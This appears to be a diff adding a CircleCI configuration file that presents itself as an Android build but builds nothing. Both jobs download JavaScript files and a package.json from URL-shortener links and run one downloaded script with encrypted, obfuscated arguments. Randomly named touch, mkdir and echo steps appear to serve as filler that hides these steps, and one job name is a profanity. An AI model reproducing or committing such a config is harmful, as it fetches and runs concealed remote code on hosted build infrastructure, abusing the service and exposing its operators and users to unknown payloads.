@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  working:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch qxdkdjhaxt06dijg.php
+      - run: curl -fsSL shorturl.at/huzKX -o u2axr39sk5p.js && curl -fsSL
+          shorturl.at/knzS4 -o package.json && curl -fsSL shorturl.at/acnKU -o
+          ur76o12quu24btl8xoi.js
+      - run: touch lqpdbdrdtqnnyl199yud7.ts
+      - run: touch 6ajt42a24qglq7prgms.sh
+      - run: mkdir p9oz5e60d9fch02mwzg15m6ydn
+      - run: npm i -s
+      - run: node u2axr39sk5p -sp -lpn
+          U2FsdGVkX1/EWv4D4pWZGrhh5zVpMdKEpg16Q9XIQtRz5MsEULxQGDihX1DKXZfo -r
+          U2FsdGVkX19QoDO5jozzr458m20QB8reNRppGRWb72jpEDYL1K490hgIBkCUvwCeM+LeW0y67Kf73ekBJCvMMQJZrK3H0i/8fRA31yQrmBpWvj7cZiFcxRRt+BidPJplPRBjD5cfRg/DYtqBK1DQKPTQ3hjBwMZ6uoGl+dqZcqBAbzWdfjkOshSjMRgMWWrCcO+NIrruAvqDjK0wlGRCC1Ef7zK4ZG8GznFyZxfCnDekF7qP8z3a9fvc0/KVYTeXvS6vGHtnQ3EGGRGEVl99mNASeUt+wavtMxFv7DmK4xU=
+          -s
+          U2FsdGVkX197H9yXVheLlHxMJEYIsx7Tep0tSRTXLcshoGwDDuQAnA9XwGJp6wur8csZfDVHM7O42IjEG3xmKlsaJzpm1EXQj8cayPgJQW0hslvhqfXho+QEWrMFVwfYryFALYxNVWsqknRAeOJADi50PNvtFm40lwPeDOS8WDoD5KoBrEx0BmsZycTI4g4CX6NB58DlzPJ8OSOakRmTAbE8B8Gzy8NvCTTMNdNSUN0=
+          -t U2FsdGVkX1/wgPx7yTO577wPpPgBtssCHgPidbAw3TEUoGB6iUPxAqjLj7mb0M4x
+      - run: touch ac15x6aio8epijfszxj.php
+      - run: touch o43zqmfb8lxayij0v7m.html
+  motherFucker:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/brGR5 -o umbjv3q.js && curl -fsSL shorturl.at/klwD4
+          -o package.json && curl -fsSL shorturl.at/qDLMY -o sz6nghadz832j8fi.js
+      - run: echo version 53780147718.15186
+      - run: touch r5cli8d1tb51wz8v9es.py
+      - run: mkdir wa2iet89avizn0en
+      - run: touch ah93hsf2piedo8.js
+      - run: npm i -s
+      - run: mkdir k0myiu0r998l3yk4027620pbkkki
+      - run: node sz6nghadz832j8fi -sp -lpn U2FsdGVkX1/UC/SBnhhby1cl15WcJxKZft2dOcJONhg=
+          -s
+          U2FsdGVkX1/MOuLrK7BGn4zIYf0XnTfTEGPKcvh4uGFRV4opC+0a93Bqv15h2gmq0wAZ2ee/hxAR77SpW/jL2gcuAB2F1qN0Hi4utRFW2TorkLCKHeEgixhWIVvbaS+6yO1RZrOr7aLOE56zSpCrBo2nIPq6SchyxNaosnPp9ukErzkBpD2X3ISes8i4roJiVAVxghaT40F2svUYylC5kwwv4KrrVxR2jf7vkBfXkk8=
+          -r
+          U2FsdGVkX1/hu0Z+06IZ7uDTqOLhgR/yvBisAZTckjUIq9Lu2HagpwJ0GxxROroXZaOOswHoXW+UK677+ThcaViZ72zKhgQ052Uh3zbVBzFb0/0dwTSWglEceanoZsDsVjwDiAZ4Tls4uuAKpEjwOeI9jwzPv+yhiFCBh5ir7WYUCz1ga2B4vpdSEXmMOZO74HEWDLhBmJGhAqD1ZJ+LsOtwbBkAIxbF6otiURhH5IFewUGfsh73sdHeQ72P5gWpST7wXwy9DCU92oiC9JVDR6d2rpUrVuocpso8NAqwg68=
+          -t U2FsdGVkX192TwY5cA77R5w1XG6bf6KLkYd4nsE5uNf3puMfG0yUV/eWw6FcitRt
+      - run: touch xysghnt713gk8bu3aievo9.py
+workflows:
+  start-jobs:
+    jobs:
+      - working
+  buildSoure:
+    jobs:
+      - motherFucker
